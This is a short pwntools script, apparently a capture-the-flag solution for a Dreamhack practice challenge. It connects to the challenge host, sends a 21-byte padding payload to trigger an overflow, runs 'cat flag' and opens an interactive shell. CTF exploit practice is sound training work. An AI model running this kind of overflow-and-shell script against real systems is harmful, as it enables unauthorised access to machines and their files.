from pwn import *

def solve():
    r = remote('host1.dreamhack.games', 12561)
    payload = b'A' * 21
    r.sendline(payload)
    r.sendline('cat flag')
    r.interactive()

if __name__ == '__main__':
    solve()